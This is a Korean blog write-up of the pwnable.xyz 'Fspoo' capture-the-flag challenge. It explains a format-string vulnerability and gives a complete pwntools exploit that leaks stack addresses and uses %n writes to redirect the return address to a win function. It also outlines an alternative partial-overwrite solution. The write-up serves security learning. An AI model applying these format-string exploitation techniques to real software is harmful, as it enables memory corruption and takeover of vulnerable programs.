---
layout: post
title:  "Pwnable.xyz Fspoo write-up"
date:   2020-01-30 19:45:55
image:  pwnable_xyz_fspoo.PNG
tags:   [Pwnable_xyz]
categories: [Write-up]
---


### 1.  문제

 

**1) mitigation 확인**

![]({{ site.baseurl }}/images/write-up/pwnable_xyz/pwnable%20xyz%20fspoo/Untitled.png)

여태 64비트 문제였는데, 이번에는 특이하게 32비트이다. 보호기법은 엥간하게 다 걸려있다

<br>

**2) 문제 확인**

![]({{ site.baseurl }}/images/write-up/pwnable_xyz/pwnable%20xyz%20fspoo/Untitled%201.png)

이름을 입력하고 수정 및 출력 등을 하는 메뉴가 나온다. 

<br>

**3) 코드 확인**

![]({{ site.baseurl }}/images/write-up/pwnable_xyz/pwnable%20xyz%20fspoo/Untitled%202.png)

메인문은 간단하다. 프로그램을 처음 실행하면 이름을 초기에 입력받는데, 이는 .bss 영역에 있는 cmd[48]에 넣는다. cmd는 총 80바이트크기의 char형 배열이다. 그 이후 모든 동작은 vuln 함수에서 일어난다.

<br>

- **vuln()**

         unsigned int vuln()
        {
          int v1; // [esp+8h] [ebp-10h]
          unsigned int v2; // [esp+Ch] [ebp-Ch]
        
          v2 = __readgsdword(0x14u);
          while ( 1 )
          {
            while ( 1 )
            {
              printf(&cmd[32]);
              puts("1. Edit name.\n2. Prep msg.\n3. Print msg.\n4. Exit.");
              printf("> ");
              __isoc99_scanf("%d", &v1);
              getchar();
              if ( (unsigned __int8)v1 != 1 )
                break;
              printf("Name: ");
              read(0, &cmd[48], 0x1Fu);
            }
            if ( (signed int)(unsigned __int8)v1 <= 1 )
              break;
            if ( (unsigned __int8)v1 == 2 )
            {
              sprintf(cmd, (const char *)&unk_B7B, &cmd[48]);
            }
            else if ( (unsigned __int8)v1 == 3 )
            {
              puts(cmd);
            }
            else
            {
        LABEL_12:
              puts("Invalid");
            }
          }
          if ( (_BYTE)v1 )
            goto LABEL_12;
          return __readgsdword(0x14u) ^ v2;
        }

<br>

코드 흐름은 심플하다. while문을 돌면서, 맨처음으로 cmd[32]위치에 있는 값을 출력해준다. 하지만 서식문자를 제대로 지정해주지 않았기 때문에, 포맷스트링 공격이 가능할 것이다

int v1에 입력한 숫자가 저장되고, v1의 하위 한바이트만 체크하여 0x01 이면 이름을 다시 수정할 수 있고, 0x02이면 sprintf를 이용하여 cmd[48]~cmd[79] 총 31바이트가  unk_B7B 형식으로 cmd에 복사를 하게 된다. unk_B7B에는  "💩   %s" 이런형식이다. 저 똥 모양은 4바이트로 표현되므로 똥모양 4바이트 + 공백3바이트 = 7바이트이고 %s에는 최대 31바이트가 들어올수있다

결국 2번메뉴를 통해 최대 cmd에 38바이트 복사가 가능하다. 마지막으로 0x03은 3번 메뉴로써, 현재 cmd에 담긴 값들이 출력된다. 최종적으로 이런것들을 fsb 버그를 이용하여, vuln함수의 ret 주소를 win함수의 ret 주소로 변경시키면 된다.

<br><br>

### 2. 접근방법

메모리 구조를 한번 생각해보자

**1) 초기**

처음에 cmd+32 영역에는 다음과 같이 Menu: 문자열이 들어가있다

![]({{ site.baseurl }}/images/write-up/pwnable_xyz/pwnable%20xyz%20fspoo/Untitled%203.png)

하지만 메뉴 1번을 누르고, 'a'*25 +%x%x 이렇게 입력한뒤, 다시 2번 메뉴를 누르게 되면 다음과 같이 변한다.

<br>

**2) 변경된 후**

![]({{ site.baseurl }}/images/write-up/pwnable_xyz/pwnable%20xyz%20fspoo/Untitled%204.png)

2번 메뉴가 종료되고 다시 while문의 시작점으로 와서 **printf(&cmd[32])**가 시행되면, 인자로 %x%x가 들어가게 된다. 따라서 스택저장되어 있는 값을 leak할 수 있다.

<br>

그렇다면 vuln함수의 ret주소를 leak을 통해 찾아낸후, 해당 주소에 win함수의 주소를 **%12345c%6n(예시)** 이런식으로 넣으면 된다. 하지만, 1번을 통해 a*25+%x%x 이렇게 입력하고 sprintf가 진행된다면, cmd+32 ~ cmd+37 까지밖에 포맷스트링을 집어넣을수 있는데, 위의 예시 포맷스트링은 6바이트를 넘어가기때문에, 현재상태로는 삽입이 불가능하다.

따라서 cmd+38부터 cmd+47 까지 공백으로 채워져 있는 공간을 공백이 아닌 값으로 채워넣어 printf에서 출력할 수 있는 길이제한을 없애버리면 된다.

<br>

**3) 정리**

그럼 이제 해야할 순서를 정리해 보자.

1. ASLR과 PIE가 걸려있음으로, 베이스 주소를 구하여 오프셋을 통해, win 함수의 주소, cmd 배열 주소와 vuln의 ret를 구하기
2. 위에서 구한 cmd의 주소를 이용해 cmd+38 ~ cmd+79 공간을 0이 아닌 다른 값으로 채우기
3. %n 을 이용하여 vuln의 ret 주소를 win의 주소로 변경하기  
    (win의 주소를 한번에 넣게 되면 값의 표현범위를 벗어나게 되므로 2바이트 씩 분할해야함)

<br><br>

### 3. 풀이

---

첫번째로 base주소를 이용하여 win함수 주소와, vuln의 ret를 구해보자

다음 사진은 처음 실행시 a*25+%p%p 이렇게 입력한 것이다. 

![]({{ site.baseurl }}/images/write-up/pwnable_xyz/pwnable%20xyz%20fspoo/Untitled%205.png)

2개의 주소가 leak이 되었는데 해당 주소가 어디에 위치하는지 확인해보자.

<br>

![]({{ site.baseurl }}/images/write-up/pwnable_xyz/pwnable%20xyz%20fspoo/Untitled%206.png)

노란색으로 칠한부분이 leak이 되었다. 현재 esp는 0x56557060인데 빨간색으로 줄친 부분이 각각 vuln함수의 ebp와 ret 이다.  이 값들은 각각 %10$p, %11$p로 접근이 가능하다

0xffffcea8의 위치에는 메인 함수의 ebp 값이 들어가 있을 것이고, 0x56555a77은 vuln함수가 종료되고 실행될 코드의 위치일 것이다.

<br>

결국 **0x56555a77**의 값이 들어있는 스택의 주소는 **0xffffce9c** 이고, 우리는 이 주소를 원한다. 따라서 %10$p를 이용하여 출력되는 값에(0xffffcea8)  0xc를 빼주면 vuln의 ret를 알수있다. 이는 베이스주소가 달라져도 그 차이는 동일하기 때문에 이렇게 구할수 있는 것이다. 코드로 표현하면 다음과 같다.

![]({{ site.baseurl }}/images/write-up/pwnable_xyz/pwnable%20xyz%20fspoo/Untitled%207.png)

<br>

그다음으로 base 주소를 구해보자. 위에서 %11$p를 이용하여 **0x56555a77(ret)** 를 구할 수 있다고 했는데, 이는 vuln함수가 끝나고 실행되는 main의 코드부분이다.

![]({{ site.baseurl }}/images/write-up/pwnable_xyz/pwnable%20xyz%20fspoo/Untitled%208.png)

<br>

따라서 %11$p로 출력되는 값에 오프셋 **0xa77**을 빼주면 base 주소를 구할 수 있고, 이를 통해 win함수의 주소와 cmd 주소를 유추할 수 있다. 코드로 표현하면 다음과 같다

![]({{ site.baseurl }}/images/write-up/pwnable_xyz/pwnable%20xyz%20fspoo/Untitled%209.png)

---

두번째로 위에서 구한 cmd배열의 주소를 이용하여 cmd배열의 중간 공백 부분들을 없애야한다. 여기서 중요하게 알아야하는게 있다. %숫자$n을 이용하여 원하는 공간에 원하는 데이터를 삽입할수 있는데, 우리가 원하는 공간, 즉 위치는 cmd+38의 주소 ~ 이다. 

하지만 현재 스택을 보면 다음사진과 같이 cmd+38 ~ 를 가리키는 주소는 들어있지 않다.

<br>

![]({{ site.baseurl }}/images/write-up/pwnable_xyz/pwnable%20xyz%20fspoo/Untitled%2010.png)

0xffffce70 부터 0xffffcee0 까지 아무리 확인해 봐도 보이지 않는다. 그렇기 때문에, 임시버퍼마냥 스택의 임의 공간에 쓰기 가능한 코드영역의 주소를 넣고, 그 주소에 cmd+38 ~ 의 주소를 넣어줘야한다. vmmap으로 코드영역중 쓰기 가능한 부분을 확인해보자. 

<br>

![]({{ site.baseurl }}/images/write-up/pwnable_xyz/pwnable%20xyz%20fspoo/Untitled%2011.png)

보면 0x56557000 부터 0x56558000까지 쓰기가 가능하므로, 이 영역중 하나를 사용하자. 나는 0x56557000의 주소를 사용하였다. 아까 base주소를 구했기 때문에 해당 주소를 base+0x2000으로 설정하면 된다.

그리고 메뉴를 선택하는 변수는 v1인데, 해당 변수의 자료형은 int로 선언되어있다. 하지만 각 조건문에서는 해당 변수의 하위 1바이트만 검사한다.

<br>

![]({{ site.baseurl }}/images/write-up/pwnable_xyz/pwnable%20xyz%20fspoo/Untitled%2012.png)

따라서 아까 구한 base+0x2000 주소에서 비트연산을 사용하여 하위 1바이트를 1 혹은 2로 변경하게되면, 우리가 원하는 쓰기 가능한 코드 영역(base+0x2000 에서 하위 1바이트만 변경)을 스택에 넣을수 있다. v1의 변수는 아래 사진의 영역에 위치한다

<br>

![]({{ site.baseurl }}/images/write-up/pwnable_xyz/pwnable%20xyz%20fspoo/Untitled%2013.png)

프로그램을 실행하고 2번 메뉴를 클릭했을때의 상황인데, 저 위치는 %6$n으로 접근이 가능하다. 따라서 **(base+0x2000 & 0xffffff00) | 1** 의 결과를 10진수로 메뉴선택시 입력하게되면, 위의 빨간 줄친 부분에 **0x56557001** 의 값이 들어가게되고, 하위 1바이트 검사 조건에 따라 Name을 수정하는 공간이 나온다.

<br>

![]({{ site.baseurl }}/images/write-up/pwnable_xyz/pwnable%20xyz%20fspoo/Untitled%2014.png)

그럼 이 Name에 **a*25+AA%6$n**을 입력하고,  **(base+0x2000 & 0xffffff00) | 2** 를 다시 메뉴에 입력하면 2번이 실행될 것이다. 그렇게 되면, 위의 빨간 줄친 부분에 다시 **0x56557002** 의 값이 들어가게되고 cmd+32에 AA%6$n이 들어가게된다 

그러면 while이 돌면서 처음의 printf가 진행되어 **2(AA가 두개임으로)**가 esp에서 **6번째(4바이트 단위)** 에 들어있는 주소값이 가리키는 곳에 써질 것이다

<br>

![]({{ site.baseurl }}/images/write-up/pwnable_xyz/pwnable%20xyz%20fspoo/Untitled%2015.png)

그럼이제 세팅이 다되었다. 메뉴를 입력할때 1,2,3,4 가 아닌 값을 입력하게되면 invalid 문자열이 뜨면서 다시 while문의 처음으로 돌아간다. 그리고 다시 printf가 실행된다. 그렇기 때문에 cmd+38, cmd+39, cmd+40, ... cmd+47까지 메뉴에 입력을 하면 끝이다.

현재 cmd+32에 **AA%6$n**이 들어있기때문에, %6$n이 수행되어, 순차적으로 입력한 cmd+38의 위치에 2가 덮혀질 것이다.

<br>

![]({{ site.baseurl }}/images/write-up/pwnable_xyz/pwnable%20xyz%20fspoo/Untitled%2016.png)

위 사진은 cmd+38의 주소값(0x56557066)을 10진수 형태로 입력한 것이다.

<br>

![]({{ site.baseurl }}/images/write-up/pwnable_xyz/pwnable%20xyz%20fspoo/Untitled%2017.png)

해당 위치에 0x02가 잘 들어가는 것을 볼 수 있다. 이렇게 cmd+47까지 진행하면 된다. 이 부분을 코드로 표현하면 다음과 같다

<br>

![]({{ site.baseurl }}/images/write-up/pwnable_xyz/pwnable%20xyz%20fspoo/Untitled%2018.png)

---

<br>

마지막으로 이제 vuln의 ret를 변경하는 일만 남았다. win의 ret를 %1234c$6n 이런식으로 입력해줘야한다. 메뉴를 입력할시 아까 사용한 tmp_1를 이용해야한다. 왜냐하면 %1234c$6n 이거를 저장하게 되면, while문을 돌고 printf가 실행되게되어 %6n의 위치가 가리키는 곳에 값을 쓰게된다.

해당 주소에 쓰기 권한이 없다면 에러가 나기때문이다. 따라서 tmp_1을 이용해서 Name에다가 

%(win_addr)c$6n+"\x00" 을 입력하면 된다. 뒤에 널바이트를 붙이는 이유는 아까 공백을 없앴으므로 printf가 출력을 하는 끝을 지정해줘야하기 때문이다. 널바이트를 안붙이면, cmd+79를 넘어서 공백을 만날때까지 쭉 출력한다.

그런데 이렇게 win_addr를 그냥 입력하면 안된다. 왜냐하면 현재 cmd+32부터 +47까지의 위치에는 AA%6$n22222222 이 입력되어있을것이다. 왜냐하면 위 사진의 for문하기 직전에 마지막으로 메뉴 2가 선택되어 cmd+32으로 +48의 값들이 복사되었고, for문이 수행되어 2가 채워졌기 때문이다.

그렇기때문에 >> tmp_1 을 입력하고 Name에 %(win_addr)c$6n+"\x00"를 입력하면, 다음 printf가 출력될때 cmd+32부터 cmd+79까지 다 출력한다.

- **AA%6$n22222222%(win_addr)c$6n00**  
- AA%6 → 4개  
- 2 → 8개

따라서 %(win_addr) 앞에 출력된 개수가 12이므로 이 값을 빼줘야 win_addr의 주소값이 제대로 %n이 가리키는 값에 들어갈 것이다. (win_addr을 2바이트씩 쪼개서 넣어야함)

- **AA%6$n22222222%(win_addr_상위2바이트-12)c$6n00**  
- **AA%6$n22222222%(win_addr_하위2바이트-12)c$6n00**

이제 마지막으로 %6$n의 위치에 vuln_ret의 주소를 넣어주면 Invalid가 출력되고 printf가 실행되어 위의 문자열이 출력되면서 vuln_ret에 win주소가 들어갈 것이다.

마지막으로 유의해야할 점은 vuln_ret의 주소값은 10진수 표현값을 넘어가게 되므로, 음수를 이용해서 맞춰줘야한다. 예를 들어 0xFFFF CF2C를 바로 10진수로 넣으면 안되니까, 0xFFFF FFFF FFFF CF2C (-12500) 이렇게 입력하고, 이 값은 v1이 int형이기 때문에 하위 4바이트만 들어가게 될 것이다.

이를 코드로 표현하면 다음과 같다

<br>

![]({{ site.baseurl }}/images/write-up/pwnable_xyz/pwnable%20xyz%20fspoo/Untitled%2019.png)

vuln_ret_addr의 하위 2바이트, 상위 2바이트에 쪼개서 넣는 과정이다.

<br>

최종 익스 코드는 다음과 같다

    from pwn import *
    context.log_level='debug'
    #p=remote("svc.pwnable.xyz",30010)
    p=process("./challenge",aslr=False)
    gdb.attach(p,""" b* 0x565558fc""")
    vuln_offset=0xa77
    win_offset=0x9fd
    cmd_offset=0x2040
    
    payload = "a"*25+"%10$p"
    
    p.sendafter("Name: ",payload)
    p.sendlineafter("> ","2")
    
    tmp=int(p.recv(10),16)
    
    vuln_ret_addr = tmp-0xc
    
    log.info(hex(tmp))
    
    p.sendlineafter("> ","1")
    
    payload = "a"*25+"%11$p"
    
    p.sendafter("Name: ",payload)
    p.sendlineafter("> ","2")
    vuln_ret=int(p.recv(10),16)
    
    log.info(hex(vuln_ret))
    
    base_addr=vuln_ret-vuln_offset #0xa77
    
    win_addr=base_addr+win_offset  #0x9fd
    win_addr_a = win_addr & 0xffff
    win_addr_b = (win_addr >> 16) & 0xffff
    
    cmd_addr=base_addr+cmd_offset
    
    tmp_1=( base_addr+0x2000 & 0xffffff00 ) | 1
    tmp_2=( base_addr+0x2000 & 0xffffff00 ) | 2
    
    payload="a"*25+"AA%6$n"
    
    p.sendlineafter("> ",str(tmp_1))
    p.sendafter("Name: ",payload)
    p.sendlineafter("> ",str(tmp_2))
    
    for i in range(10):
        p.sendlineafter("> ",str(cmd_addr+38+i))
        log.info(hex(cmd_addr+38+i))
    
    log.info("vuln ret :: "+hex(vuln_ret_addr))
    log.info("vuln ret orogin:: " +hex(vuln_ret))
    log.info("cmd :: "+hex(cmd_addr))
    #gdb.attach(p)
    
    log.info("win_addr == "+hex(win_addr))
    log.info("win_addr_b == "+hex(win_addr_b))
    log.info("win_addr_a == "+hex(win_addr_a))
    log.info("tmp_1 ==" +hex(tmp_1))
    log.info("tmp_2 =="+hex(tmp_2))
    
    payload2="%"+str(win_addr_a-12)+"c%6$n\x00"
    p.sendlineafter("> ",str(tmp_1))
    p.recvuntil("Name: ")
    p.send(payload2)
    
    p.recvuntil("> ")
    p.sendline(str(vuln_ret_addr-0x100000000))
    
    #log.info(str(vuln_ret_addr-0x100000000))
    payload2="%"+str(win_addr_b-12)+"c%6$n"+"\x00"
    p.sendlineafter("> ",str(tmp_1))
    p.recvuntil("Name: ")
    p.send(payload2)
    
    p.sendlineafter("> ",str(vuln_ret_addr-0x100000000+2))
    
    
    p.sendlineafter("> ","0")
    p.interactive()

<br><br>

### 4. 몰랐던 개념

- %숫자$서식문자(x,p,등)   :    현재 esp에서 숫자만큼 4바이트 단위로 떨어진 위치에 있는 값을 서식문자에 따라 출력해준다
- aaa%10c%6$n  :     esp에서 4바이트 단위로 6개 떨어진 위치에 있는 값이 가리키는 곳에 앞에 출력된 문자 개수 만큼 넣는다. 이 예시에는 a 3개, %10c → 10개 총 13이 입력된다
- %hn  :  해당 주소에 2바이트 만큼 입력한다
- %hhn  :  해당 주소에 1바이트 만큼 입력한다

<br><br>

### 5. 다른 풀이

이 문제를 풀면서 굉장히 많은 시간과 삽질을 진행했다. 결국 풀긴 했지만, 스승님의 롸업을 보니 매우 간단하게 풀어서 당황했었다. 그래서 추가적으로 스승님의 접근방법과 풀이 방법을 분석하였다.

<br><br>

**1) base 주소를 구하기**

이 부분은 동일하다. 단 다른점은 스택의 어느 위치에 있는 값을 가져오는지가 차이가 났다. 이부분은 오프셋만 조정하면 된다

<br>

**2) **vuln 함수의 ret는 0x56555a77이다. 그리고 win 함수의 위치는 0x565559fd이다.****

![]({{ site.baseurl }}/images/write-up/pwnable_xyz/pwnable%20xyz%20fspoo/Untitled%2020.png)

위 사진이 win 함수의 어셈 부분인데, 자세히 보면 0xa00 부분이 보인다. 프롤로그가 끝난 직후인데, 우리는 win함수가 실행만 되면 끝나기 떄문에, 프롤로그가 필요없다. 

따라서 스승님은 이 부분을 타겟으로 한 것같다. 기존 ret의 하위 1바이트 값을 00으로 변경해주면 win함수가 정상적으로 동작할 것이다. 

<br>

**3) **ret 주소 변경하기****

aslr이 걸려 있어도, 오프셋은 항상 일치하기 때문에 vuln함수의 ret 주소는 0xa77로 고정되어있다. 

!![]({{ site.baseurl }}/images/write-up/pwnable_xyz/pwnable%20xyz%20fspoo/Untitled%2021.png)

저 빨간 줄 친 부분이 ret에 들어있는 정상 값인데, 이는 스택의 0xffffce4c의 위치에 존재한다.

그렇다면 ebp인 0xffffce58을 leak한뒤, 해당 값에서 0xf를 뺴주면 0xffffce49값이 나오게 된다.

이 값을 스택의 6번째 공간에 삽입하여 'A%6n' 해당 서식문자를 printf가 출력하게 된다면, 앞에 A가 1개이므로 0x00000001가 0xffffce49의 위치에 4바이트 만큼 덮혀질 것이다.

그렇다면 **0xffffce49**(0x02가 채워짐), **0xffffce4a**(0x00이 채워짐), **0xffffce4b**(0x00이 채워짐), **0xffffce4c**(0x00이 채워짐) 이렇게 값이 채워진다.

아래의 사진 같이 입력을 최종적으로 하면

<br>

![]({{ site.baseurl }}/images/write-up/pwnable_xyz/pwnable%20xyz%20fspoo/Untitled%2022.png)

이와같이 **0xffffced9**가 들어가고,  **0xffffced9**에는 4바이트 **0x00000001**이 들어가 **0xffffcecc** 한바이트가 **0x00**으로 바뀌는걸 볼수 있다 

<br>

![]({{ site.baseurl }}/images/write-up/pwnable_xyz/pwnable%20xyz%20fspoo/Untitled%2023.png)

<br>

다시 한번 확인하면 0xa00 위치는 win함수의 프롤로그 직후이므로 win함수가 정상적으로 실행된다

![]({{ site.baseurl }}/images/write-up/pwnable_xyz/pwnable%20xyz%20fspoo/Untitled%2020.png)

<br>

>결론 : 분석 능력을 기르자.